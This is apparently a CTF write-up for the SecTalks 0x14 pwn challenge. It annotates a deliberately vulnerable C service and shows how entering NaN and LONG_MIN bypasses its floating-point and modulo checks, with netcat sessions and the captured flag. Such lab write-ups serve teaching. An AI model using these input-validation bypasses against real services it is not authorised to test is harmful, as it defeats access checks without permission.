---
layout: post
title: "Sectalks 0x14 pwn write up"
description: "sectalks 0x14 pwn write up"
category: writeups
tags: [boot2root, vulnhub]
---
For the first challenge, the source code for the service is provided.
Our task is to bypass the two checks so we can retrieve the flag.
I've added my comments to the provided source code.

```c
/* Source: http://212.71.244.194/ds/pwn/ */

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <stdlib.h>
#include <error.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <limits.h>

void err_exit(char *e) {
  fprintf(stderr, "%s\n", e);
  _exit(1);
}

char* getln(void) {
  char *buf = NULL;
  size_t len = 0;
  if (getdelim(&buf, &len, '\n', stdin) <= 0) {
    err_exit("getdelim() failed");
  }
  return buf;
}

int main(void) {
  int fd;
  char b[50];

  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  printf("Quote of the day v0.3. Answer a few questions to get one\n");

  printf("Your double number: ");
  char *buf = getln();

  double d = strtod(buf, NULL); //XXX: First challenge, bypass the floating point number check
  if (errno != 0) {
    err_exit("strtold() failed");
  }
  /* Is there any IEEE floating point number which can pass those checks? */
  if (d <= 42.0l) {
    err_exit("d is too low");
  }
  if (d > 42.0l) {
    err_exit("d is too high");
  }

  printf("Your integer number: ");
  buf = getln();

  long l = strtol(buf, NULL, 0); //XXX: Second challenge, bypass the modulo check
  if (errno != 0) {
    err_exit("strtol() failed");
  }
  if (l < 0) {
    l = -l;
  }  
  l %= 3;
  /* number%3 results in either 0, 1 or 2. So, we're safe here. Most likely :) */
  if (l == 0) {
    err_exit("Your quote: Never miss a chance to keep your mouth shut");
  }
  if (l == 1) {
    err_exit("Your quote: I'm still an atheist, thank God");
  }
  if (l == 2) {
    err_exit("Your quote: Nothing ever goes away");
  }

  printf("Getting to this point means you deserve a flag: ");
  fd = open("/home/pwn/flag.txt", O_RDONLY);
  read(fd, &b, sizeof(b));
  printf("%s\n", b);
  close(fd);
  
  return 0;
}
```

Reading the man page for the strtod function, the function is described as "functions convert the initial portion of the string pointed to by nptr to double, float, and long double representation, respectively".
Reading the description further we see that the function accepts a couple different types on input including, decimal number, hexadecimal number, infinity and not-a-number.

```
DESCRIPTION
       The strtod(), strtof(), and strtold() functions convert the initial portion of the string pointed to by nptr to double, float, and long double representation, respectively.

       The expected form of the (initial portion of the) string is optional leading white space as recognized by isspace(3), an optional plus ('+') or minus sign ('-') and then either (i) a decimal number,
       or (ii) a hexadecimal number, or (iii) an infinity, or (iv) a NAN (not-a-number).

       A decimal number consists of a nonempty sequence of decimal digits possibly containing a radix character (decimal point, locale-dependent, usually '.'), optionally followed by a decimal exponent.  A
       decimal exponent consists of an 'E' or 'e', followed by an optional plus or minus sign, followed by a nonempty sequence of decimal digits, and indicates multiplication by a power of 10.

       A hexadecimal number consists of a "0x" or "0X" followed by a nonempty sequence of hexadecimal digits possibly containing a radix character, optionally followed by a binary exponent.  A binary expo\u2010
       nent consists of a 'P' or 'p', followed by an optional plus or minus sign, followed by a nonempty sequence of decimal digits, and indicates multiplication by a power of 2.  At  least  one  of  radix
       character and binary exponent must be present.

       An infinity is either "INF" or "INFINITY", disregarding case.

       A NAN is "NAN" (disregarding case) optionally followed by a string, (n-char-sequence), where n-char-sequence specifies in an implementation-dependent way the type of NAN (see NOTES).
```

Since there are a few unusual inputs, I started inputing them into the program to see how it'd handle the input.

```
root@kali:~/sectalks# nc 10.20.0.5 60007
Quote of the day v0.3. Answer a few questions to get one
Your double number: INF
d is too high
root@kali:~/sectalks# nc 10.20.0.5 60007
Quote of the day v0.3. Answer a few questions to get one
Your double number: NaN
Your integer number: ^C
```

The program does not handle "not a number" and I'm able to bypass the first check.
Moving onto the next check, I again checked the man pages for any unusual behaviour.

```
DESCRIPTION
       The strtol() function converts the initial part of the string in nptr to a long integer value according to the given base, which must be between 2 and 36 inclusive, or be the special value 0.

       The  string  may begin with an arbitrary amount of white space (as determined by isspace(3)) followed by a single optional '+' or '-' sign.  If base is zero or 16, the string may then include a "0x"
       prefix, and the number will be read in base 16; otherwise, a zero base is taken as 10 (decimal) unless the next character is '0', in which case it is taken as 8 (octal).

       The remainder of the string is converted to a long int value in the obvious manner, stopping at the first character which is not a valid digit in the given base.  (In bases above 10, the letter  'A'
       in either uppercase or lowercase represents 10, 'B' represents 11, and so forth, with 'Z' representing 35.)

       If  endptr is not NULL, strtol() stores the address of the first invalid character in *endptr.  If there were no digits at all, strtol() stores the original value of nptr in *endptr (and returns 0).
       In particular, if *nptr is not '\0' but **endptr is '\0' on return, the entire string is valid.

       The strtoll() function works just like the strtol() function but returns a long long integer value.

RETURN VALUE
       The strtol() function returns the result of the conversion, unless the value would underflow or overflow.  If an underflow occurs, strtol() returns LONG_MIN.  If an overflow occurs, strtol() returns
       LONG_MAX.  In both cases, errno is set to ERANGE.  Precisely the same holds for strtoll() (with LLONG_MIN and LLONG_MAX instead of LONG_MIN and LONG_MAX).
```

Again we see that the function takes in a string and coverts it to a long integar. What's interesting is the return values sections where if an underflow or overflow occurs.
Checking [online](https://en.wikibooks.org/wiki/C_Programming/C_Reference/limits.h) the default values for LONG_MIN is -9223372036854775808 and LONG_MAX is +9223372036854775807.
Inputting the max and min values we see that min value gets accepted and bypasses the check.

```
root@kali:~/sectalks# nc 10.20.0.5 60007
Quote of the day v0.3. Answer a few questions to get one
Your double number: NaN
Your integer number: 9223372036854775807
Your quote: I'm still an atheist, thank God
root@kali:~/sectalks# nc 10.20.0.5 60007
Quote of the day v0.3. Answer a few questions to get one
Your double number: NaN
Your integer number: -9223372036854775808
Getting to this point means you deserve a flag: hack.Sydney{mY_g0d_1ts_fU11_of_nUm83rZ}
@
```

The flag for pwn is ***hack.Sydney{mY_g0d_1ts_fU11_of_nUm83rZ}***
